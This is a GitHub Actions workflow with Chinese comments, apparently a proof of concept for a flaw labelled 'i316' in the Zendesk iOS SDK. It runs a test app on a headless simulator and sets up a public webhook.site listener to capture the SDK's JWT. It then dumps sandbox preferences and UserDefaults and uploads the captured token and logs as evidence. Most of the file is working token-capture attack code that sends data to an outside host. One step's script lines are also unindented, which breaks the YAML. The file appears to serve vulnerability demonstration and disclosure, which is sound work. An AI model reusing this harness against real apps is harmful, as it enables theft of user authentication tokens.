# .github/workflows/i316-poc.yml — i316 远程模拟器验证
#
# 已核实事实:
#   - tag 15.2.0 的 xcframework 含 ios-arm64_x86_64-simulator slice (main 分支精简掉了)
#   - podspec s.source = git tag 15.2.0 → pod install 拉即得官方模拟器 slice
#   - macos-latest = Apple Silicon, Xcode 预装 (macos-14 标签已淘汰)
#   - iOS 模拟器与 runner 宿主共享 loopback → app 连 127.0.0.1:18080 直达监听器
#
# 证据产出: poc-evidence.mp4 (模拟器屏幕录像) + captured-jwt.json + listener.log

name: i316-simulator-poc
on:
  workflow_dispatch:
  push:

jobs:
  poc:
    runs-on: macos-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4

      - name: Create webhook.site listener (公网捕获)
        run: |
          T=$(curl -s -X POST https://webhook.site/token -H 'Content-Type: application/json' -d '{}' | python3 -c "import sys,json;print(json.load(sys.stdin)['uuid'])")
          echo "webhook uuid: $T"
          echo "WH=$T" >> $GITHUB_ENV
          # 默认响应: 200 + 最小 JSON (settings fetch 能收到响应)
          curl -s -X PUT "https://webhook.site/token/$T" -H 'Content-Type: application/json' -d '{"default_status":200,"default_content":"{\"connectivity\":{\"connected\":true},\"settings\":{}}","default_content_type":"application/json"}' > /dev/null

      - name: Generate Xcode project + 注入 webhook URL
        run: |
          brew install xcodegen
          xcodegen generate
          plutil -print PoC/Info.plist | grep -A1 ZDK || true  # 真实值直通 (api.smooch.io)

      - name: Install SDK (tag 15.2.0, 含官方模拟器 slice)
        run: pod install

      - name: Fix FeatureFlagManager init labels (自愈)
        run: python3 fix-ffm.py || echo "fix-ffm skipped"

      - name: Dump FeatureFlagManager signature (诊断)
        if: always()
        run: grep -rn "FeatureFlagManager" Pods/ --include="*.swiftinterface" | head -20 || true

      - name: Build for iOS Simulator (免签名)
        run: |
          xcodebuild -workspace PoC.xcworkspace -scheme PoC \
            -destination 'generic/platform=iOS Simulator' \
            -derivedDataPath dd build CODE_SIGNING_ALLOWED=NO

      - name: Launch on headless simulator + record screen (证据视频)
        run: |
          DEV=$(xcrun simctl list devices available | grep -m1 'iPhone' | sed -E 's/^[[:space:]]*//; s/\([0-9A-Fa-f-]{36}\)//; s/\((Shutdown|Booted)\)//; s/[[:space:]]+$//')
          echo "using device: $DEV"
          xcrun simctl boot "$DEV" 2>/dev/null || true
          echo waiting for boot...
          xcrun simctl bootstatus "$DEV" -b || true
          xcrun simctl install booted dd/Build/Products/Debug-iphonesimulator/PoC.app
          # 动态读真实 bundle id (双保险: project.yml 显式 com.poc.i316, 这里再核验)
          BID=$(plutil -extract CFBundleIdentifier raw dd/Build/Products/Debug-iphonesimulator/PoC.app/Info.plist 2>/dev/null || echo com.poc.i316)
          echo "bundle id = $BID"
          xcrun simctl get_app_container booted "$BID" app 2>&1 || true
          nohup xcrun simctl io booted recordVideo --codec h264 poc-evidence.mp4 > record-error.log 2>&1 &
          echo $! > recorder.pid
          # 启动并捕获 app 控制台输出 90 秒 (崩溃原因也会打出来)
          ( xcrun simctl launch --console-pty booted "$BID" > app-console.log 2>&1 & APID=$!; sleep 90; kill $APID 2>/dev/null; wait $APID 2>/dev/null ) || true
          echo "=== app console (crash reason if any) ==="
          tail -80 app-console.log || true
          # 再常驻启动一次 (若上一步因 console-pty 退出被杀) — 输出也捕获!
          xcrun simctl launch booted "$BID" 2>&1 || true
          sleep 3
          xcrun simctl terminate booted "$BID" 2>/dev/null || true
          sleep 2
          xcrun simctl launch --console-pty booted "$BID" > app-console2.log 2>&1 & CAP2=$!
          sleep 25
          kill $CAP2 2>/dev/null || true
          echo "=== instance 2 console (persistedUserRetrieved 在此) ==="
          grep -E "\\[poc\]|★|✔|✘" app-console2.log | head -30 || tail -20 app-console2.log
          echo "=== UserDefaults dump (找 SDK 真实持久化键) ==="
          xcrun simctl spawn booted defaults read com.poc.i316 > userdefaults-dump.txt 2>&1 || true
          DATA=$(xcrun simctl get_app_container booted com.poc.i316 data 2>/dev/null || echo "")
          if [ -n "$DATA" ]; then
            find "$DATA/Library" -type f -name "*.plist" 2>/dev/null | head -20 > sandbox-plists.txt || true
            find "$DATA/Library" -type f 2>/dev/null | grep -viE "\.css|\.png|Snapshots|LaunchCenter|Caches/[^/]*/(nsurl|com\.apple)" | head -40 > sandbox-files.txt || true
            cp $(find "$DATA/Library/Preferences" -name "*.plist" 2>/dev/null | grep -v com.apple | head -3) ./zd-prefs-*.plist 2>/dev/null || true
            for f in $(find "$DATA/Library/Preferences" -name "*.plist" 2>/dev/null | grep -v apple | head -3); do plutil -p "$f" >> zd-prefs-dump.txt 2>&1; done || true
          fi
          grep -iE "conversationKit|User|persisted" userdefaults-dump.txt | head -30 || echo "(no user keys)"
          echo "=== process alive? ==="
          xcrun simctl spawn booted launchctl list 2>/dev/null | grep -i "poc" || echo "PROCESS NOT RUNNING"
          # FeatureFlagManager 符号面 (找不阻塞的 init 变体)
          echo "=== nm FeatureFlagManager symbols ==="
          CU_BIN=$(find dd/Build/Products/Debug-iphonesimulator -path "*ZendeskSDKCoreUtilities.framework/ZendeskSDKCoreUtilities" | head -1)
          echo "CU_BIN=$CU_BIN"
          nm -gU "$CU_BIN" 2>/dev/null | grep -i "FeatureFlagManager" | head -25 || true
          echo "=== host featureflags daemons ==="
          launchctl list 2>/dev/null | grep -iE "featureflag|eligibility" || echo "(none found)"
          # 卡死线程调用栈 (一锤定音: build() 挂在哪)
          SPID=$(pgrep -x PoC | head -1)
          echo "sampling pid $SPID ..."
          sample $SPID 5 -file sample-poc.txt 2>&1 | head -3 || true
          grep -m1 -A 25 "Call graph" sample-poc.txt 2>/dev/null | head -30 || true
          sleep 60
          echo "=== listener port connections ==="
          lsof -i :18080 2>/dev/null | head -10 || echo "(no connections to 18080)"
          echo "=== crash reports ==="
          ls -t ~/Library/Logs/DiagnosticReports/ 2>/dev/null | head -5 || true
          LATEST=$(ls -t ~/Library/Logs/DiagnosticReports/*.ips 2>/dev/null | head -1)
          if [ -n "$LATEST" ]; then cp "$LATEST" ./crash-report.ips; echo "crash copied: $LATEST"; fi

      - name: Show capture result + webhook.site requests
        run: |
          kill $(cat recorder.pid) 2>/dev/null || pkill -f recordVideo || true
          sleep 3
          cat listener.log || true
          echo "---- captured-jwt.json ----"
          cat captured-jwt.json || echo "(no capture)"
          echo "---- webhook.site 收到的请求 ----"
          curl -s "https://webhook.site/token/$WH/requests?sorting=newest&per_page=20" -o wh-requests.json || true
          python3 parse-capture.py || true
          curl -s "https://webhook.site/token/$WH/requests?sorting=newest&per_page=50" -o wh-requests-full.json || true

      - name: os_log deep dump (独立 step)
        run: |
  echo "=== app os_log (ATS/connection evidence) ==="
  xcrun simctl spawn booted log show --last 4m --predicate 'processImagePath CONTAINS "PoC"' --style compact > app-oslog.txt 2>&1 || true
  echo "--- os_log 中 ATS/connection 相关 ---"
  grep -iE "App Transport|ATS|CFNetwork|NSURLError|connection|denied|blocked|failed" app-oslog.txt | head -40 || echo "(no matches)"


      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: i316-capture
          path: |
            listener.log
            captured-jwt.json
            poc-evidence.mp4
            app-console.log
            record-error.log
            crash-report.ips
            app-oslog.txt
            launch-diag.txt
            userdefaults-dump.txt
            app-console2.log
            sandbox-plists.txt
            sandbox-files.txt
            zd-prefs-dump.txt
            capture-diag.txt
            sample-poc.txt
            wh-requests.json
            wh-requests-full.json
